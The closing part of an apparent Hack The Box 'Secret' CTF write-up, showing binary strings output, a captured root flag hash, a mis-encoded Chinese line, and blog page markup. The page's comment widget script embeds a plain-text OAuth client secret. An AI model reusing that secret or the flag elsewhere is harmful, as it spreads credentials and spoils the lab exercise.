exec_mode=fork_mode
pm_exec_path=/home/dasith/local-web/index.js
OLDPWD=/
status=launching
name=index
pm_out_log_path=/home/dasith/.pm2/logs/index-out.log
_=./count
./count
bemX
__vdso_gettimeofday
__vdso_time
__vdso_clock_gettime
__vdso_clock_getres
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
AUATS
A\A]]
[A\M
A]]I
[A\]
[A\]
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
</code></pre>
<pre><code class="Plain">oot/root.txt
1bf72c039cbd58751b38c6916602f537
</code></pre>
<p>‰ªé‰∏≠Ëé∑ÂèñÂà∞‰∫ÜrootÊùÉÈôêÁöÑflagÊñá‰ª∂</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=„ÄäSecret - Hackthebox„Äã ‚Äî Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="ÂæÆÂçö">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="ÂæÆ‰ø°">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=„ÄäSecret - Hackthebox„Äã ‚Äî Lucifiel's Blog&source=Lucifiel ÊäÄÊúØÂçöÂÆ¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=„ÄäSecret - Hackthebox„Äã ‚Äî Lucifiel's Blog&url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/12/16/Hackthebox/Medium/Hackthebox-Unicode/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Unicode - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/12/03/Hackthebox/Medium/Hackthebox-Shibboleth/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Shibboleth - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        Á´ôÁÇπÊÄªËÆøÂÆ¢Êï∞Ôºö<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        Á´ôÁÇπÊÄªËÆøÈóÆÈáèÔºö<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=„ÄäSecret - Hackthebox„Äã ‚Äî Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="ÂæÆÂçö">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="ÂæÆ‰ø°">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=„ÄäSecret - Hackthebox„Äã ‚Äî Lucifiel's Blog&source=Lucifiel ÊäÄÊúØÂçöÂÆ¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=„ÄäSecret - Hackthebox„Äã ‚Äî Lucifiel's Blog&url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>Êâ´‰∏ÄÊâ´ÔºåÂàÜ‰∫´Âà∞ÂæÆ‰ø°</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACx0lEQVR42u3aMW7kMBAEQP//03vARQYMabtnRHuDUrSwKYnFgKSa8/UVX6//1/ff3//ys2XSJmmfPO2BCw8PD2/U9avrZ4fyJ1y1yd9+1YekPR4eHt5pXjJ95x26v/d+gJKlKOkzHh4e3ifw2sk92aDfA2bDhIeHh/c5vHbB2IQd+W88PDy8v+Il2+I2zG1ji2TjfjBrwcPDw4t5pyfuE7+Pn+/h4eHhjU7V26m5LSNIwtnX4sLDw8M7wUs2x20Z1lUX2213G/hGywMeHh7eQ7z7LuadnsUZbYTRlh3g4eHhnea1JVBtwDpDJkP8ZnnDw8PDO8BrYbPANz/6yt9efAzg4eHhPcSbxantYVVbdtAOdFQZgYeHh/cQL5/E861tsmzM2gz7gIeHh/cQbz9Zt2UEeVlAHhDXZ3R4eHh4C97sIL8uewoGq11+agseHh7eQ7xNtDo7xDoRPVy2xMPDwzvG2y8D7SFW8q68V5d/x8PDwzvAyw+TZhFAG/jO/vtmK4+Hh4f3KO+pAGIzfSdb7RaJh4eH91e8/cKQH2IlxQd5m8svBjw8PLw1L39xHuO2g9J2Oo8q8PDw8M7x8mOtfGu7iRtmFRBv7sXDw8M7wGu3v08tHpsyrLZMAQ8PD2/PS27eHHHNJvRkwYjweHh4eAd4+cvyYPdEyzySeHMMhoeHh/cQL59qN53O84H9QlJ/JeDh4eGVz0/i2lmbPNRoy7CKDwA8PDy8Y7z2mH8W6RYhQr6m3bfHw8PDe5T3Kq+2E5sYIo8bLu/Fw8PDO8CbTbj5pva+Q5vQYV+whYeHh7fhJYtBvjDM7mq378Vw4+Hh4R3jbTrdbspnpVrDMBoPDw/vY3izaCDfKM8Owy631Hh4eHh/xJuViibPz3nJARseHh7e7/D2033SrTZcWGXPeHh4eMd4m0/9dipPOt2yHxgIPDw8vJT3D75H2k83ez7TAAAAAElFTkSuQmCC" alt="ÂæÆ‰ø°ÂàÜ‰∫´‰∫åÁª¥Á†Å">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
